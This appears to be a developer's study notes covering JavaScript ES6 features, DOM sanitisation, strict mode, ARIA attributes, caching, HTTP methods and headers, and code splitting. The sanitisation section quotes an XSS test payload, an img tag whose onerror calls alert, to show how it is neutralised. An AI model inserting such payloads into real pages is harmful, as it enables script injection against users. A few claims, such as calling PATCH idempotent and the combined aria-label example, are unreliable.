### 8. **Classes**
   - Introduces a cleaner, more intuitive syntax for creating objects and inheritance:
   ```javascript
   class Animal {
     constructor(name) {
       this.name = name;
     }
     speak() {
       console.log(`${this.name} makes a noise.`);
     }
   }
   ```

### 9. **Modules**
   - Native support for modular code with `import` and `export` statements:
   ```javascript
   // file: math.js
   export const add = (a, b) => a + b;

   // file: app.js
   import { add } from './math';
   ```

### 10. **Promises**
   - Promises provide a cleaner, more readable way to handle asynchronous code:
   ```javascript
   const fetchData = () => new Promise((resolve, reject) => {
     setTimeout(() => resolve('Data received!'), 1000);
   });
   fetchData().then(data => console.log(data));
   ```

### 11. **Symbol**
   - A new primitive type, often used to create unique object keys.
   ```javascript
   const uniqueKey = Symbol('key');
   const obj = { [uniqueKey]: 'value' };
   ```

### 12. **Map and Set**
   - `Map` and `Set` data structures allow for more flexible and optimized collections.
   ```javascript
   const map = new Map();
   map.set('key', 'value');
   
   const set = new Set([1, 2, 3, 3]);
   ```

### 13. **`for...of` Loop**
   - A new way to iterate over iterable objects like arrays and strings.
   ```javascript
   for (const item of [1, 2, 3]) {
     console.log(item);
   }
   ```

These features, together, greatly expanded JavaScript’s functionality and usability, particularly for handling modular code, asynchronous operations, and more complex data structures.



**Sanitized DOM:**

- Sanitizing the DOM generally refers to cleaning or removing any potentially harmful code, particularly user-generated content, to prevent security vulnerabilities like Cross-Site Scripting (XSS) attacks.
- In JavaScript, this process usually involves filtering or escaping any HTML, CSS, or JavaScript that could be inserted by an attacker. 

Here's a breakdown of some common ways to sanitize the DOM in JavaScript:

### 1. Using `textContent` and `innerText`
Instead of setting HTML directly with `innerHTML`, using `textContent` or `innerText` safely escapes content by converting it to plain text:

```javascript
const userInput = "<img src='x' onerror='alert(1)'>"; // Potentially harmful input
const safeElement = document.createElement("div");
safeElement.textContent = userInput; // Content is treated as plain text, not HTML
document.body.appendChild(safeElement);
```

### 2. Sanitizing Libraries
Libraries like **DOMPurify** provide comprehensive sanitization solutions by parsing and cleaning up HTML based on rules to strip out dangerous elements or attributes.

```javascript
// Assuming DOMPurify is available in your environment
const userInput = "<img src='x' onerror='alert(1)'>"; 
const safeHTML = DOMPurify.sanitize(userInput); // Returns a sanitized string
document.body.innerHTML = safeHTML; // Safe to use as innerHTML
```

### 3. Strict Content Security Policies (CSP)
Setting a Content Security Policy (CSP) in your application helps control which scripts, styles, or media can run. While it doesn’t sanitize input, it provides another layer of security to block unauthorized scripts.

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

### 4. Using Trusted Types (Experimental)
If available, Trusted Types is a new browser API that can help mitigate DOM-based XSS by enforcing that any DOM manipulation uses only safe, trusted data.

### General Recommendation
For any web application, you should:
- Use `textContent` or `innerText` for user inputs displayed on the DOM.
- Consider libraries like DOMPurify when working with HTML directly.
- Apply a CSP for additional security.

This approach reduces the chances of security vulnerabilities, especially from user-generated content.


## Strict Mode in JavaScript
- In JavaScript, `"use strict";` is a directive that enables strict mode. When you include `"use strict";` at the beginning of a script or a function, it helps catch common coding mistakes and "unsafe" actions that can lead to bugs.

Here’s what it does:

1. **Eliminates some silent errors**: For example, assigning a value to an undeclared variable will throw an error in strict mode, which would otherwise just create a global variable.
   
2. **Prevents certain syntax from being used**: Some features like `with` statements are not allowed in strict mode.

3. **Throws errors for unsafe actions**: Actions that might lead to bugs or unexpected behavior, such as duplicate parameter names or writing to a read-only property, will throw errors in strict mode.

4. **Improves performance**: Browsers can optimize JavaScript code in strict mode better, as it limits certain risky behaviors.

You can use strict mode at the top of a file or within a function like this:

```javascript
"use strict";

function myFunction() {
  // Code here is in strict mode
}
```

Or in a function:

```javascript
function myFunction() {
  "use strict";
  // Code here is in strict mode
}
```

Strict mode is helpful because it enforces better coding practices and can prevent bugs, especially in larger projects.

**Examples:**

Certainly! Here are a few examples showing how `"use strict";` affects JavaScript code.

### 1. Prevents the Use of Undeclared Variables
In non-strict mode, if you assign a value to a variable that hasn’t been declared, JavaScript will create a global variable. In strict mode, this throws an error.

**Without strict mode:**
```javascript
myVar = 10; // This will work (and create a global variable)
console.log(myVar); // 10
```

**With strict mode:**
```javascript
"use strict";
myVar = 10; // ReferenceError: myVar is not defined
```

### 2. Prevents Duplicate Parameter Names
In strict mode, having duplicate parameter names in a function is not allowed.

**Without strict mode:**
```javascript
function sum(a, a, c) { // No error
  return a + a + c;
}
console.log(sum(1, 2, 3)); // Output: 7
```

**With strict mode:**
```javascript
"use strict";
function sum(a, a, c) { // SyntaxError: Duplicate parameter name not allowed in this context
  return a + a + c;
}
```

### 3. Prevents Assignment to Read-Only Properties
In strict mode, you can’t assign a value to a read-only property. This would silently fail in non-strict mode, but it throws an error in strict mode.

**Without strict mode:**
```javascript
const obj = {};
Object.defineProperty(obj, "x", { value: 42, writable: false });
obj.x = 9; // No error, but obj.x remains 42
console.log(obj.x); // Output: 42
```

**With strict mode:**
```javascript
"use strict";
const obj = {};
Object.defineProperty(obj, "x", { value: 42, writable: false });
obj.x = 9; // TypeError: Cannot assign to read-only property 'x' of object
```

### 4. Disallows `this` Binding to Global Object in Functions
In non-strict mode, if you call a function without any object context, `this` refers to the global object (e.g., `window` in browsers). In strict mode, `this` becomes `undefined` in such cases.

**Without strict mode:**
```javascript
function showThis() {
  console.log(this); // `this` refers to the global object (e.g., `window`)
}
showThis(); // [object Window] (or global object in Node)
```

**With strict mode:**
```javascript
"use strict";
function showThis() {
  console.log(this); // `this` is undefined
}
showThis(); // Output: undefined
```

### 5. Disallows `with` Statements
The `with` statement is not allowed in strict mode because it makes code harder to predict and optimize.

**Without strict mode:**
```javascript
const obj = { x: 10 };
with (obj) {
  console.log(x); // Output: 10
}
```

**With strict mode:**
```javascript
"use strict";
const obj = { x: 10 };
with (obj) { // SyntaxError: Strict mode code may not include a with statement
  console.log(x);
}
```

These examples illustrate how `"use strict";` helps prevent certain mistakes and enforces cleaner, more reliable JavaScript code.



**Will hoisting works in strict mode?**
Yes, **hoisting** still works in strict mode in JavaScript. Hoisting is a behavior where variable and function declarations are moved to the top of their scope (either the function or global scope) before code execution. This applies to both strict and non-strict modes.

However, there are some **differences in variable declarations** that can make it feel a bit different in strict mode, especially when using `let` and `const` (introduced with ES6), which don’t hoist in the same way as `var`. Here’s how hoisting behaves under strict mode:

### 1. **Function Hoisting**
Function declarations are fully hoisted, even in strict mode. This means you can call a function before it’s declared, and it will work as expected.

**Example:**
```javascript
"use strict";
myFunction(); // This works

function myFunction() {
  console.log("Function is hoisted");
}
```

### 2. **Variable Hoisting with `var`**
Variables declared with `var` are still hoisted in strict mode, but undeclared variables will throw an error.

**Example:**
```javascript
"use strict";
console.log(myVar); // undefined (due to hoisting)
var myVar = 10;
console.log(myVar); // 10
```

In non-strict mode, if you accidentally use a variable without declaring it, JavaScript will create a global variable. In strict mode, this will throw a `ReferenceError`.

```javascript
"use strict";
myVar = 10; // ReferenceError: myVar is not defined
```

### 3. **Hoisting with `let` and `const`**
Variables declared with `let` and `const` are also hoisted but are not initialized. They exist in a "temporal dead zone" from the start of the block until their declaration is encountered, meaning you cannot access them before they’re declared.

**Example with `let` and `const`:**
```javascript
"use strict";
console.log(myLet); // ReferenceError: Cannot access 'myLet' before initialization
let myLet = 10;

console.log(myConst); // ReferenceError: Cannot access 'myConst' before initialization
const myConst = 20;
```

In summary:
- Hoisting itself is not affected by strict mode.
- `var` declarations are hoisted to the top, but using an undeclared variable causes an error in strict mode.
- `let` and `const` are hoisted but are in a temporal dead zone, and accessing them before declaration results in a `ReferenceError`.


## Accessibility
Accessibility tags, often referred to as **ARIA (Accessible Rich Internet Applications)** roles and attributes, help make web applications more accessible to people with disabilities. These tags provide extra information to assistive technologies (e.g., screen readers), ensuring content and functionality are usable by everyone.

### Key ARIA Roles and Attributes
Here’s an overview of commonly used ARIA roles and attributes:

#### **Roles**
Roles define the purpose of an element in the context of the application.
- `role="button"`: Identifies an element as a button.
- `role="alert"`: Marks content as an alert (e.g., for error messages).
- `role="dialog"`: Identifies a modal dialog box.
- `role="navigation"`: Marks a section as site navigation.
- `role="main"`: Denotes the main content area of the page.
- `role="region"`: Marks a significant section of a document.
- `role="progressbar"`: Represents a progress indicator.
- `role="checkbox"`, `role="radio"`, `role="slider"`, etc.: For interactive controls.

#### **Attributes**
Attributes provide additional context or define specific behaviors for roles.
- `aria-label`: Provides a label for an element (e.g., `aria-label="Close"`).
- `aria-labelledby`: Links an element to a label by its `id`.
- `aria-describedby`: Associates additional descriptive information by its `id`.
- `aria-hidden="true"`: Hides content from assistive technologies.
- `aria-live`: Indicates dynamic content changes (e.g., `aria-live="polite"` or `aria-live="assertive"`).
- `aria-expanded`: Indicates whether a collapsible element is expanded (`true` or `false`).
- `aria-checked`: Describes the state of a checkbox or similar element (`true`, `false`, or `mixed`).
- `aria-disabled`: Marks an element as disabled.
- `aria-required`: Specifies that an element is required.

#### **Landmark Roles**
These provide navigation landmarks:
- `<header role="banner">`
- `<nav role="navigation">`
- `<main role="main">`
- `<footer role="contentinfo">`
- `<aside role="complementary">`

### Example Usage
Here’s an example of ARIA tags in a web component:

```html
<button aria-label="Submit form">Submit</button>

<div role="alert" aria-live="assertive">
  Form submission failed. Please try again.
</div>

<nav role="navigation" aria-label="Primary">
  <ul>
    <li><a href="/home">Home</a></li>
    <li><a href="/about">About</a></li>
  </ul>
</nav>
```

### Best Practices
1. **Use Native HTML Semantics First**: Many HTML elements (e.g., `<button>`, `<input>`, `<header>`) are inherently accessible. Use ARIA only when necessary.
2. **Don’t Overuse ARIA**: Misusing ARIA can degrade accessibility.
3. **Test with Assistive Technologies**: Ensure your application works well with screen readers.
4. **Follow ARIA Authoring Practices**: Refer to the [ARIA Authoring Practices Guide](https://www.w3.org/TR/wai-aria-practices/) for detailed examples and patterns.

## aria-label vs aria-labelledby
Both `aria-label` and `aria-labelledby` are used to provide accessible labels for elements, but they work in different ways and are suitable for different scenarios.

---

### **1. `aria-label`**
- **Purpose**: Directly specifies a label for an element.
- **How it works**: The value of `aria-label` is a string that acts as the element's label.
- **Use case**: When the label is not visible on the screen or when you want to override a visible label with a custom one.

#### Example:
```html
<button aria-label="Close">X</button>
```
- Here, the screen reader will announce "Close" instead of "X," providing more context for the user.

---

### **2. `aria-labelledby`**
- **Purpose**: Associates an element with another element (or elements) that contains the label text.
- **How it works**: You specify the `id` of the element(s) that provides the label.
- **Use case**: When the label text is already visible on the page and you want to link it to an interactive element.

#### Example:
```html
<label id="close-label">Close</label>
<button aria-labelledby="close-label">X</button>
```
- Here, the screen reader will announce "Close" because it references the visible label.

---

### **Key Differences**
| **Aspect**             | **`aria-label`**                                    | **`aria-labelledby`**                                |
|-------------------------|----------------------------------------------------|-----------------------------------------------------|
| **Content**            | Provides a custom string as the label.             | References another element(s) containing the label. |
| **Visibility**         | Label text is not visible on the screen.           | Uses visible text for the label.                   |
| **Complexity**         | Simple to use for short, static labels.            | Ideal for longer or dynamic labels.                |
| **Override**           | Can override the visible text of an element.       | Cannot override visible text.                      |

---

### **Choosing Between Them**
- Use **`aria-label`** when:
  - The label is **not present on the screen**.
  - You want to provide **additional context** to assistive technologies (e.g., clarifying an icon's function).

- Use **`aria-labelledby`** when:
  - The label is **already visible on the screen**.
  - You want to ensure the label text is consistent for both visual and assistive technology users.

---

### Combined Example
```html
<div>
  <h1 id="heading">Welcome</h1>
  <button aria-labelledby="heading" aria-label="Click to learn more">Learn More</button>
</div>
```
- Here, `aria-labelledby` references the visible heading "Welcome."
- The `aria-label` provides additional context, helping screen readers announce the button as "Click to learn more."

By understanding their differences, you can ensure better accessibility for your applications!


### aria-live
The `aria-live` attribute in HTML is used to notify assistive technologies (like screen readers) of dynamic content changes without requiring the user to explicitly navigate to the updated section. This attribute is especially useful for content that updates frequently, such as error messages, notifications, or chat messages.

---

### **Syntax**

```html
<div aria-live="polite">Dynamic content here</div>
```

---

### **Values of `aria-live`**

1. **`off` (default)**  
   - Assistive technologies ignore changes in this region.
   - Example:
     ```html
     <div aria-live="off">Static content</div>
     ```

2. **`polite`**  
   - Announces updates **when the user is idle**. This is suitable for non-critical updates.
   - Example:
     ```html
     <div aria-live="polite">New messages will appear here.</div>
     ```

3. **`assertive`**  
   - Immediately interrupts the user to announce updates. Use for critical updates like error messages.
   - Example:
     ```html
     <div aria-live="assertive">Error: Something went wrong!</div>
     ```

---

### **Example Usage**

#### Error Notification:
```html
<div aria-live="assertive" id="error-message">
  <!-- Dynamic error messages will go here -->
</div>
<script>
  const errorDiv = document.getElementById('error-message');
  errorDiv.textContent = 'Please fill out all required fields.';
</script>
```

#### Chat Message Updates:
```html
<div aria-live="polite" id="chat-box">
  <!-- New chat messages will appear here -->
</div>
<script>
  const chatBox = document.getElementById('chat-box');
  chatBox.textContent = 'John: Hi there!';
</script>
```

---

### **Best Practices**
- Only use `aria-live` for regions that frequently update and are relevant to users relying on assistive technologies.
- Avoid overusing `assertive`, as it can be intrusive.
- Combine `aria-live` with `role` attributes (e.g., `role="alert"` or `role="status"`) for better context.

Example:
```html
<div role="alert" aria-live="assertive">
  You have been logged out due to inactivity.
</div>
```


## Caching vs Memoization
**Caching** and **memoization** are related techniques used to optimize performance by storing previously computed results. However, they have different scopes and use cases. Here's a comparison:

### **Caching**
1. **Definition**: 
   - Caching refers to storing *data* or *responses* so that they can be quickly retrieved in subsequent uses, instead of recalculating or fetching them again.

2. **Scope**: 
   - General-purpose optimization, often used in data storage (e.g., HTTP caches, database query results, file reads).

3. **Use Case**: 
   - Reduces the overhead of fetching or recomputing expensive data (e.g., web server responses, images, or database queries).

4. **Implementation**: 
   - Implemented at various levels (browser cache, server-side cache, in-memory caches like Redis, etc.).

5. **Examples**:
   - Storing API responses in local storage or in-memory for reuse.
   - Browser caching of static assets (CSS, JS, images).

---

### **Memoization**
1. **Definition**: 
   - Memoization is a specific form of caching focused on *function outputs*. It stores the results of function calls based on the input arguments to avoid recomputing them.

2. **Scope**: 
   - Limited to optimizing pure functions (functions with deterministic output for a given input).

3. **Use Case**: 
   - Reduces redundant calculations by storing results for specific inputs (e.g., recursion-heavy algorithms like Fibonacci computation).

4. **Implementation**: 
   - Implemented within a function's logic, often using an object or a map to store input-output pairs.

5. **Examples**:
   - Calculating the Fibonacci sequence:
     ```javascript
     const memo = {};
     function fibonacci(n) {
         if (n <= 1) return n;
         if (memo[n]) return memo[n];
         memo[n] = fibonacci(n - 1) + fibonacci(n - 2);
         return memo[n];
     }
     ```
   - Optimizing a function with a library like `lodash.memoize`.

---

### **Key Differences**
| Aspect              | Caching                          | Memoization                      |
|---------------------|-----------------------------------|-----------------------------------|
| **Scope**           | General-purpose optimization     | Function-specific optimization   |
| **Granularity**     | Stores arbitrary data/responses  | Stores function results          |
| **Use Case**        | API responses, assets, database  | Repeated function calls          |
| **Complexity**      | Can be more complex (e.g., cache invalidation) | Simple (depends on function logic) |

- In summary, **memoization** is a *specific type of caching* focused on functions, while **caching** is a broader concept that applies to storing any reusable data.

When the page is refreshed, the persistence of cached or memoized data depends on where and how the data is stored:
---

### **Caching**
- **Browser-based caching** (e.g., localStorage, sessionStorage, cookies):
  - **localStorage**: Data persists even after a page refresh or browser restart.
  - **sessionStorage**: Data resets after the tab or browser is closed but survives a refresh.
  - **HTTP caching**: Typically handled by the browser or server, data persists as long as the cache policy allows.
- **In-memory caching** (e.g., in JavaScript variables, server memory):
  - Data is lost on a page refresh because the memory is cleared when the page is reloaded.
  - For server-side caching (e.g., Redis), the cache remains unless explicitly cleared.

---

### **Memoization**
- Memoization is typically implemented using in-memory data structures like objects or maps within the JavaScript runtime. 
  - **Reset on page refresh**: Since JavaScript runtime is reloaded on a page refresh, memoized data stored in memory will be reset.
  - Persistent memoization can be achieved by combining it with browser storage mechanisms like `localStorage`.

---

### **Which Resets on Page Refresh?**
1. **Resets**:
   - In-memory caching (e.g., variables).
   - Memoization (e.g., function-specific data stored in variables).

2. **Persists**:
   - Browser-based caches (`localStorage`, `sessionStorage`, cookies).
   - Server-side or external caches (e.g., Redis, CDN).

If you specifically want the data to persist across refreshes, consider using **localStorage** or an external caching mechanism. For temporary persistence (within a session), use **sessionStorage**.



## Authentication vs Authorization
Authentication and authorization are two distinct processes that are often used together in the context of security, especially in web applications and systems. Here's a comparison of the two:

---

### **1. Authentication**
- **Definition**: The process of verifying the identity of a user or system.
- **Purpose**: Ensures that the person or system is who they claim to be.
- **How it works**:
  - Typically involves credentials like usernames and passwords.
  - May use additional factors (e.g., two-factor authentication, biometrics).
  - Examples of protocols: OAuth, OpenID, or systems like LDAP.
- **Outcome**: Once authenticated, the user is recognized by the system.
- **Example**: Logging in to a website with your username and password.

---

### **2. Authorization**
- **Definition**: The process of determining what actions or resources an authenticated user or system has permission to access.
- **Purpose**: Controls what the user can do or access after their identity is verified.
- **How it works**:
  - Checks permissions against roles, access control lists (ACLs), or policies.
  - Often depends on the user's roles or group memberships.
- **Outcome**: Specifies access levels (read, write, delete, etc.).
- **Example**: After logging in, being able to view only your profile but not access admin settings.

---

### **Key Differences**
| **Aspect**         | **Authentication**                       | **Authorization**                     |
|---------------------|------------------------------------------|----------------------------------------|
| **Focus**          | Verifying identity                      | Granting or denying access             |
| **Sequence**       | Happens first                           | Happens after authentication           |
| **Result**         | Confirms "Who are you?"                 | Confirms "What are you allowed to do?" or "What you can do?" |
| **Data used**      | Credentials like username/password      | Roles, permissions, policies           |
| **Example**        | Signing in to a system                  | Accessing a specific page or feature   |

---

**Relationship**: 
Authentication is a prerequisite for authorization. You cannot authorize a user unless you know their identity through authentication.




## Search Engine Optimization (SEO)
**Search Engine Optimization (SEO)** refers to the process of optimizing a website or online content to improve its visibility and ranking on search engine results pages (SERPs). The goal of SEO is to attract organic (unpaid) traffic from search engines like Google, Bing, or Yahoo by ensuring the content is relevant, user-friendly, and authoritative for specific keywords or queries.

### **Key Components of SEO**

1. **On-Page SEO**  
   Focuses on optimizing individual pages on your website for target keywords.  
   - **Content Quality**: Creating high-quality, relevant, and engaging content.
   - **Keywords**: Researching and integrating keywords strategically into titles, headings, and body text.
   - **Meta Tags**: Writing compelling meta titles and descriptions to improve click-through rates.
   - **Internal Linking**: Linking to other relevant pages within your website.
   - **URL Structure**: Using clean and descriptive URLs.

2. **Off-Page SEO**  
   Involves activities outside your website to improve its authority and ranking.  
   - **Backlinks**: Acquiring links from other reputable websites to your content.
   - **Social Signals**: Engaging on social media platforms to drive traffic.
   - **Brand Mentions**: Increasing your website's visibility through mentions on other sites.

3. **Technical SEO**  
   Ensures your website meets technical requirements for search engine crawling and indexing.  
   - **Site Speed**: Ensuring fast loading times.
   - **Mobile-Friendliness**: Optimizing for mobile devices.
   - **Secure Connections**: Implementing HTTPS for secure browsing.
   - **Crawlability**: Ensuring search engines can easily access and index your site.
   - **Structured Data**: Adding schema markup to help search engines understand your content.

4. **Local SEO**  
   Targets local audiences and searches.  
   - **Google My Business**: Optimizing your profile.
   - **NAP Consistency**: Ensuring Name, Address, and Phone information are consistent across the web.
   - **Local Keywords**: Using location-specific keywords.

5. **Content SEO**  
   Emphasizes creating content that is optimized for both users and search engines.  
   - **Blog Posts**: Regularly publishing fresh, relevant articles.
   - **Multimedia**: Including videos, infographics, and images to engage users.
   - **Answering User Queries**: Creating content that addresses common questions or search intents.

---

### **Why is SEO Important?**
1. **Increases Organic Traffic**: Higher rankings lead to more visitors from search engines.
2. **Builds Credibility**: Users trust search engines, and higher rankings can establish authority.
3. **Cost-Effective**: Unlike paid advertising, SEO generates traffic without direct costs.
4. **Improves User Experience**: Optimizing for SEO often improves the overall user experience.
5. **Long-Term Benefits**: Good SEO practices can provide sustained traffic over time.

---

### **How SEO Works**
Search engines like Google use algorithms to determine the relevance and quality of a website for a specific search query. These algorithms consider factors such as:
- **Keyword Usage**
- **Backlink Profile**
- **User Engagement (e.g., click-through rates, bounce rates)**
- **Content Freshness**
- **Website Structure and Usability**

By aligning your website with these factors, you can improve its chances of ranking higher in search results.



## Will the session persists when I opened the duplicate tab?
- Yes, **sessionStorage** data persists across tabs that are duplicates of the original tab, as long as they belong to the same **browser session** and **same-origin** (protocol, domain, and port).
- This is because when you duplicate a tab, the browser creates a new tab with the same session state, including `sessionStorage`.

### Key Points:
- **sessionStorage** is unique to a tab (or browser window). Normally, the data is not shared between separate tabs or windows.
- When you duplicate a tab, the new tab inherits the `sessionStorage` data from the original tab.
- Any subsequent changes to `sessionStorage` in one tab **do not affect** the other tab because they are isolated after duplication.

- If you need data to persist across all tabs (or windows), consider using **localStorage** or another method like **cookies** or **IndexedDB**, as `localStorage` is shared across all tabs of the same origin.



## HTTP Methods
HTTP (Hypertext Transfer Protocol) methods are verbs that indicate the desired action to be performed on a resource in a web server. Each method is associated with a specific operation. Here’s an overview of the most commonly used HTTP methods:

### 1. **GET**
- **Purpose:** Retrieve data from the server.
- **Characteristics:**
  - Does not modify the resource.
  - Parameters can be included in the URL as a query string.
  - Idempotent: Multiple identical requests produce the same result.
- **Example:** 
  ```
  GET /api/users
  ```

### 2. **POST**
- **Purpose:** Send data to the server to create a new resource.
- **Characteristics:**
  - The request body contains the data to be sent to the server.
  - Not idempotent: Sending the same request multiple times may result in multiple resources being created.
- **Example:**
  ```
  POST /api/users
  Body: { "name": "John", "email": "john@example.com" }
  ```

### 3. **PUT**
- **Purpose:** Update an existing resource or create it if it does not exist.
- **Characteristics:**
  - Typically replaces the entire resource with the new data.
  - Idempotent.
- **Example:**
  ```
  PUT /api/users/1
  Body: { "name": "John Updated", "email": "john.updated@example.com" }
  ```

### 4. **PATCH**
- **Purpose:** Apply partial modifications to a resource.
- **Characteristics:**
  - Only the specified fields are updated.
  - Idempotent.
- **Example:**
  ```
  PATCH /api/users/1
  Body: { "email": "john.updated@example.com" }
  ```

### 5. **DELETE**
- **Purpose:** Remove a resource from the server.
- **Characteristics:**
  - Idempotent: Deleting a non-existent resource has no effect.
- **Example:**
  ```
  DELETE /api/users/1
  ```

### 6. **OPTIONS**
- **Purpose:** Describe the communication options for the target resource.
- **Characteristics:**
  - Often used for Cross-Origin Resource Sharing (CORS) preflight requests.
- **Example:**
  ```
  OPTIONS /api/users
  ```

### 7. **HEAD**
- **Purpose:** Similar to GET but retrieves only the headers and no body.
- **Characteristics:**
  - Used to check the resource's metadata, such as content length or last modified date.
  - Idempotent.
- **Example:**
  ```
  HEAD /api/users
  ```

### Less Common Methods:
- **TRACE:** Echoes back the received request for debugging.
- **CONNECT:** Establishes a tunnel to the server, often used for SSL (HTTPS).

### Use Cases Summary:
| **Method**  | **Action**                          | **Idempotent?** |
|-------------|-------------------------------------|-----------------|
| **GET**     | Retrieve resource                  | Yes             |
| **POST**    | Create new resource                | No              |
| **PUT**     | Replace resource                   | Yes             |
| **PATCH**   | Modify part of resource            | Yes             |
| **DELETE**  | Remove resource                    | Yes             |
| **OPTIONS** | Get supported methods              | Yes             |
| **HEAD**    | Retrieve headers only              | Yes             |


## HTTP Headers
HTTP headers are key-value pairs sent as part of an HTTP request or response. They provide additional information about the request or response, such as metadata, content type, caching policies, authentication, and more.

Here’s an overview of the common types of HTTP headers:

---

## **Types of HTTP Headers**

### 1. **Request Headers**
Headers sent by the client to provide information about the request or client capabilities.

#### Examples:
- **`Accept`**: Specifies the content types the client can understand.
  ```
  Accept: application/json
  ```
- **`Authorization`**: Contains credentials for authentication.
  ```
  Authorization: Bearer <token>
  ```
- **`User-Agent`**: Provides information about the client making the request.
  ```
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
  ```
- **`Content-Type`**: Specifies the format of the request body (e.g., for POST or PUT).
  ```
  Content-Type: application/json
  ```
- **`Cookie`**: Sends cookies from the client to the server.
  ```
  Cookie: sessionId=abc123
  ```

---

### 2. **Response Headers**
Headers sent by the server to provide metadata about the response.

#### Examples:
- **`Content-Type`**: Indicates the format of the response body.
  ```
  Content-Type: application/json
  ```
- **`Set-Cookie`**: Sends cookies to be stored on the client.
  ```
  Set-Cookie: sessionId=abc123; HttpOnly
  ```
- **`Cache-Control`**: Directs caching behavior.
  ```
  Cache-Control: no-cache, no-store, must-revalidate
  ```
- **`Server`**: Provides information about the server handling the request.
  ```
  Server: Apache/2.4.1 (Unix)
  ```

---

### 3. **General Headers**
Headers that apply to both requests and responses.

#### Examples:
- **`Date`**: Timestamp of when the message was sent.
  ```
  Date: Tue, 29 Nov 2024 12:34:56 GMT
  ```
- **`Connection`**: Control options for the current connection (e.g., keep-alive).
  ```
  Connection: keep-alive
  ```

---

### 4. **Entity Headers**
Headers providing metadata about the resource being sent.

#### Examples:
- **`Content-Length`**: Specifies the size of the body in bytes.
  ```
  Content-Length: 348
  ```
- **`Content-Encoding`**: Indicates compression (e.g., gzip).
  ```
  Content-Encoding: gzip
  ```
- **`Last-Modified`**: Timestamp of the last modification to the resource.
  ```
  Last-Modified: Mon, 28 Nov 2024 16:00:00 GMT
  ```

---

## **Common Use Cases of HTTP Headers**

### Authentication:
- **`Authorization`**: Used for Bearer Tokens, Basic Auth, etc.
  ```
  Authorization: Bearer <token>
  ```

### CORS (Cross-Origin Resource Sharing):
- **`Access-Control-Allow-Origin`**: Specifies allowed origins for cross-origin requests.
  ```
  Access-Control-Allow-Origin: *
  ```
- **`Access-Control-Allow-Methods`**: Specifies allowed HTTP methods.
  ```
  Access-Control-Allow-Methods: GET, POST, OPTIONS
  ```

### Content Negotiation:
- **`Accept`** and **`Content-Type`**:
  ```
  Accept: application/json
  Content-Type: application/json
  ```

### Security:
- **`Strict-Transport-Security`**: Enforces HTTPS connections.
  ```
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  ```
- **`X-Content-Type-Options`**: Prevents MIME type sniffing.
  ```
  X-Content-Type-Options: nosniff
  ```

---

## **How to Set Headers in JavaScript (Fetch API Example)**

```javascript
const url = 'https://api.example.com/data';

const options = {
  method: 'GET',
  headers: {
    'Authorization': 'Bearer your_token_here',
    'Accept': 'application/json',
    'Content-Type': 'application/json',
  },
};

fetch(url, options)
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));
```


## Code Splitting

Code splitting is an optimization technique used in modern web development to break down a large JavaScript bundle into smaller chunks. This approach improves the performance and user experience of web applications by allowing the browser to load only the necessary code for the current page or feature, instead of downloading and executing the entire application upfront.

### Benefits of Code Splitting
1. **Faster Initial Load Times:** Only the code needed for the initial view is loaded, reducing the time to interactive (TTI).
2. **Lazy Loading:** Additional code is loaded on demand as the user navigates or interacts with the application.
3. **Better Caching:** Smaller chunks allow for more efficient caching; only modified chunks are downloaded during updates.
4. **Improved Performance on Low Bandwidth:** Users on slower networks benefit from smaller, incremental loads.

---

### Methods of Code Splitting in JavaScript

1. **Dynamic Imports** (Supported natively in ES6+)
   - Use `import()` to dynamically load modules when needed.  
   Example:
   ```javascript
   document.getElementById("loadButton").addEventListener("click", () => {
       import('./module.js')
           .then(module => {
               module.doSomething();
           })
           .catch(err => {
               console.error("Error loading the module", err);
           });
   });
   ```

2. **Using Module Bundlers**  
   Tools like **Webpack**, **Rollup**, or **Vite** support code splitting natively:
   - **Webpack:** Automatically splits code based on dynamic imports or entry points.
   - Example of dynamic imports in Webpack:
     ```javascript
     import(/* webpackChunkName: "module" */ './module')
         .then(module => {
             module.default();
         });
     ```

3. **React-Specific Tools**  
   React provides tools like `React.lazy` and `Suspense` for code splitting components:
   ```javascript
   import React, { Suspense } from 'react';

   const LazyComponent = React.lazy(() => import('./MyComponent'));

   function App() {
       return (
           <Suspense fallback={<div>Loading...</div>}>
               <LazyComponent />
           </Suspense>
       );
   }
   ```

4. **Multiple Entry Points**  
   By defining multiple entry points in tools like Webpack, you can create separate bundles for different parts of your application.

   Example Webpack configuration:
   ```javascript
   module.exports = {
       entry: {
           home: './src/home.js',
           dashboard: './src/dashboard.js',
       },
       output: {
           filename: '[name].bundle.js',
           path: __dirname + '/dist',
       },
   };
   ```

---

### Tips for Effective Code Splitting
1. **Analyze Your Bundles:** Use tools like Webpack Bundle Analyzer to visualize and optimize chunking strategies.
2. **Chunk Naming:** Use meaningful chunk names for better debugging and network analysis.
3. **Avoid Over-splitting:** Too many small chunks can increase HTTP requests and latency.
4. **Combine with Tree Shaking:** To remove unused code from bundles.


## How to find the root cause of website slowness?
- Ex: Identify the root cause for slowness of 9gag.com

Identifying the root cause of website slowness involves systematically analyzing both the client-side and server-side components of the website. Here's a structured approach to help you:

---

### 1. **Client-Side Analysis**
- **Use Performance Tools:**
  - **Google Chrome DevTools:** Inspect the **Performance** tab for detailed metrics like JavaScript execution time, paint times, and network requests.
  - **Lighthouse Audits:** Generate performance reports to identify issues like render-blocking resources, image optimization, and unused JavaScript.
- **Key Areas to Check:**
  - **Network Requests:** Look for slow-loading assets (e.g., large images, scripts, CSS) in the **Network** tab.
  - **Render-Blocking Resources:** Identify and defer or preload critical CSS/JS.
  - **JavaScript Execution:** Check for large or unnecessary JavaScript files. Minify and bundle scripts where appropriate.
  - **Third-Party Dependencies:** Monitor performance impact from third-party scripts (e.g., ads, analytics).

---

### 2. **Server-Side Analysis**
- **Backend Logs:**
  - Check server logs for slow queries, errors, or high resource usage.
- **Database Performance:**
  - Analyze slow database queries using tools like **MySQL Slow Query Log** or **pg_stat_statements** (for PostgreSQL).
  - Optimize indexes and queries.
- **Application Logic:**
  - Profile the application code to find bottlenecks (e.g., excessive API calls, redundant processing).
  - Tools: **New Relic**, **Datadog**, or built-in profilers for your language/framework.
- **Server Health:**
  - Monitor CPU, memory, and disk I/O usage using server monitoring tools like **htop**, **top**, or cloud service dashboards.

---

### 3. **Network Performance**
- **Latency and Bandwidth:**
  - Use tools like **Pingdom** or **GTmetrix** to test latency and overall performance from different geographical locations.
- **DNS Resolution:**
  - Check DNS resolution times. Consider using a faster DNS provider like **Cloudflare** or **Google DNS**.
